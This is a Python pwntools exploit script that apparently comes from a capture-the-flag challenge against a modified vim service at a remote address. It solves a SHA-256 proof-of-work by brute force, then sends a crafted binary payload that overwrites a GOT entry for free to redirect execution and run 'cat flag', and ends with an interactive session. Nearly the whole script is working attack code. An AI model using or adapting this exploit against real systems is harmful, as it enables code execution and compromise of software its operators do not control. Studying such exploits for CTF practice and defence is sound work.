from pwn import *
from ctypes import *
import os
from hashlib import sha256
#import roputils as rop

remote_addr = "111.186.63.13"
remote_port = 10001


local_addr = "127.0.0.1"
local_port = 1807

#pc = "./vim"
#pwn_elf = ELF(pc)
#pwn_rop = rop.ROP(pc)

uselibc = 2 #0 for no,1 for i386,2 for x64
local = 0
haslibc = 0
atta = 0

if uselibc == 2:
	context.arch = "amd64"
else:
	context.arch = "i386"

if uselibc ==2 and haslibc == 0:
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
else:
	if uselibc == 1 and haslibc == 0:
		libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
	else:
		libc = ELF('./libc.so.6')

if local == 1:
	if haslibc:
		p = process(pc,env={'LD_PRELOAD':'./libc.so.6'})
	else:
		p = process(pc)
elif local == 0:
	p = remote(remote_addr,remote_port)
	if haslibc:
		libc = ELF('./libc.so.6')
else:
	p = remote(local_addr,local_port)
	if haslibc:
		libc = ELF('./libc.so.6')

context.log_level = True

if local:
	if atta:
		gdb.attach(p,'b *0x0000000000414739\n b*0x000000000041436D')# b*0x0000000000000CBB +0x555555554000 ')


def sla(a,b):
	p.sendlineafter(a,b)

def sa(a,b):
	p.sendafter(a,b)

def ru(a):
	p.recvuntil(a)

def rv(a):
	return p.recv(a)

def rl():
	return p.recvline()

def sn(a):
	p.send(a)

def lg(s,addr):
	print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def add_name(idx,name):
	sla('choice :','1')
	sla('Index :',str(idx))
	sla('Name :',name)

def show(idx):
	sla('choice :','2')
	sla('Index :',str(idx))

def delete(idx):
	sla('choice :','3')
	sla('Index :',str(idx))

def check():
	tmp = rl()
	digest = tmp.split(' == ')[0].split('+')[1][:-1]
	sha = tmp.split(' == ')[1].strip('\n')
	print digest
	#rl()
	al = []
	for i in range(0, len(sha), 2):
		b = sha[i:i+2]
		al.append(chr(int(b, 16)))
	sha_t = ''.join(al)
	print sha_t
	flag = 0
	mapp = []
	for i in range(0x30,0x3a):
		mapp.append(chr(i))
	for i in range(0x41,0x41+26):
		mapp.append(chr(i))
	for i in range(0x61,0x61+26):
		mapp.append(chr(i))
	s = ''.join(mapp)
	#print s
	#cnt = 0
	for i1 in s:
		if flag==1:
			break
		for i2 in s:
			if flag==1:
				break
			for i3 in s:
				if flag==1:
					break
				for i4 in s:
					#cnt = cnt + 1
					tmp = i1+i2+i3+i4+digest
					#if cnt == 15:
						#print i1,i2,i3,i4,tmp
						#print sha256(tmp).digest()
					#print sha256(tmp+digest).digest()
					if sha256(tmp).digest() == sha_t:
						print 'success'
						sla('XXXX:',i1+i2+i3+i4)
						flag = 1
						break

def hack():
	raw_input()
	check()
	fp = open('1.txt','rb')
	data = fp.read()
	free_got = 0x8a8238 - 0xc
	prefix = data[:12]
	fade_data = prefix + '\xff\xff\xff\x9e' + '\x03\x03\x02\x01\x00' + '\x00'*7 + '\x71' + '\x11'*8
	fade_data += p64(free_got)[::-1] + '\x00\x00\x00\x10'
	fade_data = fade_data.ljust(0x70,'\x99') + p64(0x4c9163)[::-1] + ('\x00\x00\x00\x00cat flag').ljust(0x10,'\x00')[::-1]  + '\x99'*0x10 + p64(free_got)[::-1] + '\x00'*0x10

	sla('OK\n',str(len(fade_data)))
	sn(fade_data)
	#fp = open('output.txt','wb')
	#while True:
	#	fp.write(rv(1))
	#	fp.flush()
	p.interactive()
hack()